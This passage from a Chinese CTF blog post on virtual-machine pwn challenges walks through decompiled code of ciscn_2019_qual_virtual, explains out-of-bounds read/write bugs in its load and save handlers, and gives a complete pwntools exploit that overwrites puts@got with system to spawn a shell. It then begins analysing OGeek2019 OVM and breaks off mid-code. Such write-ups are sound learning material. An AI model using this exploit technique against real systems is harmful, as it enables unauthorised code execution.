punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v2 <span class="token operator">-</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>sub函数和add函数的区别在于sub函数将两个值的插写入data段</p><p>mul</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">mul</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v3 <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将两个值的乘积写入data段</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">div</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v2 <span class="token operator">/</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将两个值的商写入data段</p><p>load</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">load</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>load函数只接受一个参数，为data段结构体指针，首先从data段取出一个值，然后我们分析一下下面这一段的意思</p><pre><code>*(_QWORD *)(*(_QWORD *)a1 + 8 * (*(int *)(a1 + 12) + v2))</code></pre><p><strong>*(_QWORD *)a1</strong>为data段结构体的值，即data段指针，<strong>*(int *)(a1 + 12)</strong>为data段中存储数据的个数，再加上v2，作为索引的依据，将<strong><em>(_QWORD *)(</em>(_QWORD <em>)a1 + 8 * (</em>(int *)(a1 + 12) + v2))</strong>的值载入data段。这里关键的一点就是，v2作为索引的一部分是用户输入的，而这里也并未对v2的值做限制，当v2为负数时就可以越界读，将不属于data段的值载入data段，这里就是漏洞之一。</p><p>save</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">save</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>从data段取出两个值，v2的作用和load中一样，以data段为基地址，将<strong><em>(_QWORD *)(8 * (</em>(int *)(a1 + 12) + v2) + *(_QWORD *)a1)</strong> 的地址中写入v3，这里也没有限制v2的大小，因此存在越界写漏洞。</p><p>至此，整个程序的主要功能就分析完了，接下来就该进行利用了</p><p>由于程序没有开启FULL RELRO，所以我们可以复写got表，这里我们复写puts@got为system，因为当执行完opcode之后程序会通过puts函数输出我们一开始输入的程序名，只要我们输入程序名为/bin/sh，这样最后就会执行system(“/bin/sh”)，即可getshell(也可以通过复写puts为onegadget，不过system(“/bin/sh”)更稳一些)。</p><p>注意到heap区上方</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C3.jpg" alt="3"></p><p>0x404000处存在大量libc地址</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C4.jpg" alt="4"></p><p>而程序本身没有输出功能，所以我们需要利用程序提供的功能进行写入加减运算</p><p>load和save功能都是在data段进行的，而且存在越界，它们的的参数都是data结构体的指针</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C5.jpg" alt="5"></p><p>而对data段进行操作都是通过存储在data结构体中的data段指针进行操作的，只要我们修改了这个指针，data段的位置也会随之改变，所以我们可以利用save的越界写漏洞，将data段指针修改到0x404000附近(也可以直接在data段进行越界读写，毕竟越界读写的范围也没有限定，不过这样计算起来会比较麻烦)。</p><p>我们将data段指针改写为stderr下方的一段无内容处，即0x4040d0</p><p>这个操作对应的payload为</p><pre><code>push push save 4210896 -3</code></pre><p>这样操作的原因可以自己调试</p><p>之后我们对data段的操作就都是以0x4040d0为基地址来操作的，我们将上方的stderr的地址(或者别的地址)load到data段，然后计算出在libc中stderr和system的相对偏移，push到data段，然后将stderr和偏移相加就能得出system的地址，接着再利用save功能，将system写入puts@got(在0x404020处)即可，完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./ciscn_2019_qual_virtual'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_qual_virtual'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'ciscn_2019_qual_virtual'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name:\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>data_addr <span class="token operator">=</span> <span class="token number">0x4040d0</span>offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>opcode <span class="token operator">=</span> <span class="token string">'push push save push load push add push save'</span>data <span class="token operator">=</span> <span class="token punctuation">[</span>data_addr<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> offset<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>    payload <span class="token operator">+=</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'instruction:\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io,'b *0x401cce')</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data:\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x2-OGeek2019-Final-OVM"><a href="#0x2-OGeek2019-Final-OVM" class="headerlink" title="0x2.[OGeek2019 Final]OVM"></a>0x2.[OGeek2019 Final]OVM</h2><p>首先检查保护</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C6.jpg" alt="6"></p><p>只有canary未开启</p><p>IDA分析</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> __int16 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2h] [rbp-Eh]</span>  <span class="token keyword">unsigned</span> __int16 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int16 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+6h] [rbp-Ah]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  comment<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x8CuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> signal_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"WELCOME TO OVM PWN\n"</span><span class="token punctuation">,</span> <span class="token number">0x16uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"PC: "</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"SP: "</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>  reg<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"CODE SIZE: "</span><span class="token punctuation">,</span> <span class="token number">0xBuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v4 <span class="token operator">></span> <span class="token number">0x10000</span> <span class="token operator">||</span> <span class="token operator">!</span>v4 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"EXCEPTION\n"</span><span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">155</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"CODE: "</span><span class="token punctuation">,</span> <span class="token number">6uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  running <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v4 <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>memory<span class="token punctuation">[</span>v5 <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>memory<span class="token punctuation">[</span>i <span class="token operator">+</span> v5<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFF000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF000000</span> <span class="token punctuation">)</span>      memory<span class="token punctuation">[</span>i <span class="token operator">+</span> v5<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE0000000</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> running <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v7 <span class="token operator">=</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">execute</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"HOW DO YOU FEEL AT OVM?\n"</span><span class="token punctuation">,</span> <span class="token number">0x1BuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> comment<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x8CuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sendcomment</span><span class="token punctuation">(</span>comment<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Bye\n"</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>首先让我们输入PC和SP</p><pre><code>PC 程序计数器，它存放的是一个内存地址，该地址中存放着 下一条 要执行的计算机指令。SP 指针寄存器，永远指向当前的栈顶。</code></pre><p>然后让我们输入codesize，最大为0x10000字节</p><p>接着依次输入code</p><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v4 <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>memory<span class="token punctuation">[</span>v5 <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>memory<span class="token punctuation">[</span>i <span class="token operator">+</span> v5<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xFF000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF000000</span> <span class="token punctuation">)</span>    memory<span class="token punctuation">[</span>i <span class="token operator">+</span> v5<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE0000000</span><span class="token punctuation">;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>if语句是用来限制code的值的</p><p>接着进入where循环，fetch函数如下</p><pre class=" language-c"><code class="language-c">__int64 <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  v0 <span class="token operator">=</span> reg<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  reg<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>memory<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里使用到了reg[15],存储着PC的值，我们看一看这个程序使用的一些数据</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C7.jpg" alt="7"></p><p>每次将PC的值增加1，依次读取memory中的code</p><p>再看到execute函数</p><pre class=" language-c"><code class="language-c">ssize_t __fastcall <span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  ssize_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> __int8 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">unsigned</span> __int8 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+19h] [rbp-7h]</span>  <span class="token keyword">unsigned</span> __int8 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ah] [rbp-6h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span>a1 <span class="token operator">&amp;</span> <span class="token number">0xF0000u</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">&amp;</span> <span class="token number">0xF00</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> a1 <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//将一个code分割为四个部分，最高1字节作为分类标志</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x70</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0x70</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>    reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">+</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//加法</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x70</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xB0</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0xB0</span>    <span class="token punctuation">{</span>      result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>      reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">^</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//异或</span>      <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xB0</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xD0</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0xD0</span>      <span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>        reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">>></span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//右移位运算</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span 